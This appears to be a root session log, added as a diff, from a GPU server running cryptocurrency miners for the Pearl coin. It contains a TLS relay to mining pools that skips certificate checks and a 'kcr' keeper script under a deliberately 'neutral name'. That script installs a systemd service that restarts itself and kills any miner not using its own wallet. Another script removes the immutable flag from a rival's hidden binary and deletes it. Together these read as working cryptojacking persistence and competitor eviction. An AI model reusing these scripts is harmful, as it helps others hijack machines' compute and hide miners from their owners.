@@ -1,0 +1,205 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### INVENTORY 2026-11-25T00:26:15Z
+uid=0(root) gid=0(root) groups=0(root)
+g0023
+--- relay.py
+import socket, ssl, select, threading, time
+
+LISTEN = ("127.0.0.1", 17048)
+UP = [("prl-sg.kryptex.network", 8048), ("prl-eu.kryptex.network", 8048),
+      ("prl-us.kryptex.network", 8048), ("prl-hk.kryptex.network", 8048)]
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+def log(*a):
+    print(time.strftime("%H:%M:%S"), *a, flush=True)
+
+def connect_up():
+    for h, p in UP:
+        try:
+            s = socket.create_connection((h, p), timeout=10)
+            s = ctx.wrap_socket(s, server_hostname=h)
+            s.settimeout(900)
+            log("upstream", h, p, "ok", s.cipher()[0])
+            return s, h
+        except Exception as e:
+            log("upstream", h, p, "fail", repr(e)[:90])
+    return None, None
+
+def pump(c, name):
+    up, h = connect_up()
+    if up is None:
+        try: c.close()
+        except Exception: pass
+        return
+    c.settimeout(900)
+    nb = 0
+    try:
+        while True:
+            r, _, _ = select.select([c, up], [], [], 900)
+            if not r:
+                log("idle", name, nb); break
+            for s in r:
+                try:
+                    d = s.recv(16384)
+                except Exception as e:
+                    log("recv-err", name, repr(e)[:70]); d = b""
+                if not d:
+                    raise SystemExit
+                if s is c:
+                    up.sendall(d)
+                else:
+                    c.sendall(d)
+                nb += len(d)
+    except SystemExit:
+        log("eof", name, "bytes", nb)
+    except Exception as e:
+        log("pump-end", name, repr(e)[:90], "bytes", nb)
+    finally:
+        for s in (up, c):
+            try: s.close()
+            except Exception: pass
+
+def main():
+    srv = socket.socket()
+--- keep.sh ul2
+#!/bin/bash
+for p in $(pgrep -f '\.plhm' 2>/dev/null); do kill -9 $p; done
+[ -e /usr/local/bin/.plhm ] && { chattr -i /usr/local/bin/.plhm 2>/dev/null; rm -f /usr/local/bin/.plhm; }
+if ! pgrep -f '/root/ul2/krig-miner' >/dev/null; then
+  for i in 0 1 2 3 4 5 6 7; do
+    CUDA_VISIBLE_DEVICES=$i setsid nohup /root/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g$i --password x -d 0 --api-port 14$i >>/root/ul2/m$i.log 2>&1 &
+  done
+fi
+--- keep.sh ul
+#!/bin/sh
+exit 0
+--- kcr
+-rwxr-xr-x 1 root root 1222 Nov 25 07:58 /usr/local/sbin/kcr
+#!/bin/bash
+# resilient pearl keeper for sm_80+ ULTRON cards (neutral name)
+set -u
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+N=$(nvidia-smi -L 2>/dev/null | wc -l)
+[ "$N" -ge 1 ] || exit 0
+if [ ! -f /etc/systemd/system/plh-card@.service ]; then
+  cat > /etc/systemd/system/plh-card@.service <<'U'
+[Unit]
+Description=plh pearlhash card %i
+After=network-online.target
+[Service]
+Type=simple
+ExecStart=/opt/plh/run_card.sh %i
+Restart=always
+RestartSec=5
+Nice=-5
+KillMode=control-group
+[Install]
+WantedBy=multi-user.target
+U
+  systemctl daemon-reload
+fi
+systemctl enable plh-card@.service plh-keeper.service >/dev/null 2>&1
+# evict foreign-wallet miners only, leave our own
+for p in $(pgrep -f 'krig-miner|wildrig-multi' 2>/dev/null); do
+  cmd=$(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null)
+  case "$cmd" in *"$W"*) : ;; *) kill -9 $p 2>/dev/null ;; esac
+done
+for i in $(seq 0 $((N-1))); do systemctl reset-failed plh-card@$i 2>/dev/null; systemctl start plh-card@$i 2>/dev/null; done
+if [ "${1:-}" = "--loop" ]; then while :; do sleep 30; N=$(nvidia-smi -L 2>/dev/null | wc -l); for i in $(seq 0 $((N-1))); do systemctl is-active -q plh-card@$i || systemctl start plh-card@$i 2>/dev/null; done; done; fi
+--- argv-g0
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+--- argv-g7
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+--- ul dir
+total 29168
+-rw-r--r-- 1 root root      155 Nov 25 03:00 24h.jsonl
+-rw-r--r-- 1 root root     1717 Nov 25 08:25 _s.sh
+drwxr-xr-x 2 root root     4096 Nov 25 04:52 actor.dead.1795553749
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g0.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g1.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g2.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g3.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g4.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g5.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g6.txt
+-rw-r--r-- 1 root root      278 Nov 25 02:29 argv-g7.txt
+-rw-r--r-- 1 root root     2312 Nov 25 02:29 argv.backup.1795544976
+drwxr-xr-x 2 root root     4096 Nov 25 02:28 backup
+drwxr-xr-x 2 root root     4096 Nov 25 02:46 cmd-disabled
+-rw-r--r-- 1 root root     1543 Nov 25 05:17 g1.log
+-rw-r--r-- 1 root root     1543 Nov 25 05:17 g2.log
+-rw-r--r-- 1 root root     1543 Nov 25 05:17 g3.log
+-rw-r--r-- 1 root root     1544 Nov 25 05:17 g4.log
+-rw-r--r-- 1 root root     1544 Nov 25 05:17 g5.log
+-rw-r--r-- 1 root root     1544 Nov 25 05:17 g6.log
+-rw-r--r-- 1 root root     1544 Nov 25 05:17 g7.log
+-rwxr-xr-x 1 root root       17 Nov 25 07:29 keep-loop.sh
+-rw-r--r-- 1 root root        0 Nov 25 02:30 keep.log
+-rwxr-xr-x 1 root root       17 Nov 25 07:29 keep.sh
+--- plh units
+UNIT FILE         STATE    VENDOR PRESET
+plh-card@.service disabled enabled
+
+1 unit files listed.
+### RELAY-PROTO
+== relay 127.0.0.1:17048 auth-first
+ RECV auth {"id":1,"result":true,"error":null}
+ RECV sub {"id":null,"method":"mining.notify","params":{"header":"00000020868186bd6ca3a00e49e7631964cda4d33d6adf868653c7b690deb5444e81c9819fa90e40b3ade76262ddd52793a5832c20b27fdc7f22a844d579
+== relay 127.0.0.1:17048 sub-first
+### FIX
+kcr moved: d00b472c
+started g0: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g1: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g2: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g3: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g4: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g5: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g6: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+started g7: /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-
+### POST
+  UNIT                  LOAD      ACTIVE SUB    DESCRIPTION
+● chrony.service        loaded    failed failed chrony, an NTP client/server
+● fwupd-refresh.service loaded    failed failed Refresh fwupd metadata and update motd
+● rsyslog.service       loaded    failed failed System Logging Service
+● ssh.service           loaded    failed failed OpenBSD Secure Shell server
+● t19test.service       loaded    failed failed t19
+● ul-prl-g0.service     not-found failed failed ul-prl-g0.service
+● ul-prl-g1.service     not-found failed failed ul-prl-g1.service
+● ul-prl-g2.service     not-found failed failed ul-prl-g2.service
+● ul-prl-g3.service     not-found failed failed ul-prl-g3.service
+g0: failed
+g1: failed
+g2: failed
+g3: failed
+g4: failed
+g5: failed
+g6: failed
+g7: failed
+0, 100 %, 6327 MiB
+1, 100 %, 6327 MiB
+2, 100 %, 6327 MiB
+3, 100 %, 6327 MiB
+4, 100 %, 6327 MiB
+5, 100 %, 6327 MiB
+6, 100 %, 6327 MiB
+7, 100 %, 6327 MiB
+ 754096       00:47 /opt/plh/krig-miner --coin pearl -d 0 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g0 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g0.log --api-port 4110 --api-host 127.0.0.1
+ 754099       00:47 /opt/plh/krig-miner --coin pearl -d 1 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g1 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g1.log --api-port 4111 --api-host 127.0.0.1
+ 754103       00:47 /opt/plh/krig-miner --coin pearl -d 2 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g2 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g2.log --api-port 4112 --api-host 127.0.0.1
+ 754107       00:47 /opt/plh/krig-miner --coin pearl -d 3 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g3 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g3.log --api-port 4113 --api-host 127.0.0.1
+ 754112       00:47 /opt/plh/krig-miner --coin pearl -d 4 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g4 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g4.log --api-port 4114 --api-host 127.0.0.1
+ 754116       00:47 /opt/plh/krig-miner --coin pearl -d 5 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g5 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g5.log --api-port 4115 --api-host 127.0.0.1
+ 754121       00:47 /opt/plh/krig-miner --coin pearl -d 6 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g6 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g6.log --api-port 4116 --api-host 127.0.0.1
+ 754126       00:47 /opt/plh/krig-miner --coin pearl -d 7 --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+ssl://prl-eu.kryptex.network:8048 --url stratum+ssl://prl-us.kryptex.network:8048 --url stratum+ssl://prl-hk.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 -u prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l.plh-123-184-7-135-g7 -p x --no-tui -l info --log-file /var/log/plh-123-184-7-135-g7.log --api-port 4117 --api-host 127.0.0.1
+POOLHTTP=200
+POOLROW ul-t2-123-184-7-135-g5 offline valid=203 age=57 3h=69221994272546.51
+POOLROW ul-t2-123-184-7-135-g3 offline valid=180 age=83 3h=58379995169617.54
+POOLROW ul-t2-123-184-7-135-g7 offline valid=163 age=82 3h=55043995445639.4
+POOLROW ul-t2-123-184-7-135-g0 offline valid=172 age=55 3h=68387994341551.98
+POOLROW ul-t2-123-184-7-135-g2 offline valid=191 age=91 3h=69221994272546.52
+POOLROW ul-t2-123-184-7-135-g6 offline valid=201 age=210 3h=65885994548568.37
+POOLROW ul-t2-123-184-7-135-g1 offline valid=181 age=55 3h=62549994824590.22
+POOLROW ul-t2-123-184-7-135-g4 offline valid=181 age=156 3h=50873995790666.72
+### DONE 2026-11-25T00:28:13Z
